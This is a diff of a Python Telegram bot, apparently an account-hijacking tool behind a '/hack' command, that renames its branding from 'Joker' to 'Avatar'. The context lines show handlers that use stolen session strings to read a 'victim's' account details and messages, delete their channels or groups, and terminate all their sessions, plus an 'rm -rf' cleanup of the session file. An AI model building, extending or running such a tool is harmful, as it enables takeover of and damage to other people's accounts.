@@ -187,7 +187,7 @@ menu = '''
 
 '''
 mm = '''
-قم بلأنضمام الى قناة الجوكر @Jepthon
+قم بلأنضمام الى قناة افاتار @Jepthon
 '''
 
 keyboard = [
@@ -212,7 +212,7 @@ keyboard = [
     Button.inline("N", data="N"),
     ],
   [
-    Button.url("سورس الجوكر 🤡", "https://t.me/jepthon")
+    Button.url("سورس افاتار 🤡", "https://t.me/jepthon")
     ]
 ]
 
@@ -280,7 +280,7 @@ async def users(event):
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nشكراً لأستخدامك سورس الجوكر ❤️. \n/hack", buttons=keyboard)
+        await event.reply(i + "\n\nشكراً لأستخدامك سورس افاتار ❤️. \n/hack", buttons=keyboard)
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
 async def users(event):
@@ -293,7 +293,7 @@ async def users(event):
     else:
       return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
     i = await userinfo(strses.text)
-    await event.reply(i + "\n\nشكراً لأستخدامك سورس الجوكر ❤️.\n/hack", buttons=keyboard)
+    await event.reply(i + "\n\nشكراً لأستخدامك سورس افاتار ❤️.\n/hack", buttons=keyboard)
     
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
 async def users(event):
@@ -321,7 +321,7 @@ async def users(event):
       else:
         return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nشكرا لأستخدامك سورس الجوكر", buttons=keyboard)
+      await event.reply(i + "\n\nشكرا لأستخدامك سورس افاتار", buttons=keyboard)
     
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
@@ -367,7 +367,7 @@ async def users(event):
       await x.send_message("اعطيني معرف/ايدي القناة او الكروب")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("لقد تم حذف القناة/الكروب شكرا لأستخدامك الجوكر.", buttons=keyboard)
+      await event.reply("لقد تم حذف القناة/الكروب شكرا لأستخدامك افاتار.", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
 async def users(event):
@@ -396,7 +396,7 @@ async def users(event):
       else:
         return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
       i = await terminate(strses.text)
-      await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك الجوكر.", buttons=keyboard)
+      await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك افاتار.", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
 async def users(event):
